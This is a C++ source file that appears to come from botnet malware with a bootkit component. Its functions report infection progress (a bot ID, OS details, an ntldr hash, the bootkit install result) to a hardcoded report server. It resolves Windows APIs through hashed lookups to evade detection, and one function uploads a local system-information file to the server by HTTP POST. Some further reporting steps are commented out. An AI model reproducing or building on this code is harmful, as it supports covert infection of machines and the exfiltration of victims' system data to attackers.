#include "DbgRptBootkit.h"
#include <shlobj.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "Crypt.h"
#include "BotHTTP.h"
#include "BotUtils.h"
#include "BotDebug.h"
#include "CabPacker.h" 
#include "DbgRpt.h"

void DebugReportStep1()
{
	CHAR BotUid[200];
	CHAR NtldrMd5Buffer[100];
	PCHAR OsInfo = NULL;
	PCHAR NtldrMd5 = NULL;

	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);
	OsInfo = GetOSInfo();
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "beforerbt");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "os", OsInfo);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	PP_DPRINTF("DebugReportStep1: sending url='%S'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	MemFree(OsInfo);
}

void DebugReportStep2(DWORD BkInstallResult)
{
	CHAR BotUid[200];
	CHAR value[50];

	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	m_memset(BotUid, 0, sizeof(BotUid));
	m_memset(value, 0, sizeof(value));

	GenerateUid(BotUid);
	_pwsprintfA(value, "%u", BkInstallResult);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "bkinstall");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "val", value);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
	
	PP_DPRINTF("DebugReportStep2: sending url='%S'", URL);

	HTTP::Get(URL, NULL, NULL);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}


//void DebugReportStep3()
//{
//	CHAR BotUid[200];
//	
//	m_memset(BotUid, 0, sizeof(BotUid));
//
//	GenerateUid(BotUid);
//
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "rbt");
//	AddURLParam(Fields, "uid", BotUid);
//	AddURLParam(Fields, "val", "notrbt");
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF("DebugReportStep3: sending url='%S'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}
//
//void DebugReportStep5()
//{
//	CHAR BotUid[200];
//	
//	m_memset(BotUid, 0, sizeof(BotUid));
//
//	GenerateUid(BotUid);
//
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "dpl");
//	AddURLParam(Fields, "uid", BotUid);
//	AddURLParam(Fields, "val", "true");
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF("DebugReportStep5: sending url='%S'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}
//
//void DebugReportStep6()
//{
//	CHAR BotUid[200];
//	
//	m_memset(BotUid, 0, sizeof(BotUid));
//
//	GenerateUid(BotUid);
//
//	PStrings Fields = Strings::Create();
//	AddURLParam(Fields, "cmd", "exe");
//	AddURLParam(Fields, "uid", BotUid);
//	AddURLParam(Fields, "val", "true");
//
//	PCHAR Params = Strings::GetText(Fields, "&");
//	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
//	
//	PP_DPRINTF("DebugReportStep6: sending url='%S'", URL);
//
//	HTTP::Get(URL, NULL, NULL);
//
//	STR::Free(URL);
//	STR::Free(Params);
//	Strings::Free(Fields);
//}

void DebugReportSendSysInfo(PCHAR uid, PCHAR path)
{
	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "storefile");
	AddURLParam(Fields, "uid", (PCHAR)uid);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	PP_DPRINTF("DebugReportSendSysInfo: sending url='%S'", URL);

	PMultiPartData Data = MultiPartData::Create();

	MultiPartData::AddFileField(Data, "rep", path, NULL);
	bool Result = HTTP::Post(URL, Data, NULL, NULL);

	PP_DPRINTF("DebugReportSendSysInfo: HTTP::Post() result %d", Result);

	MultiPartData::Free(Data);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

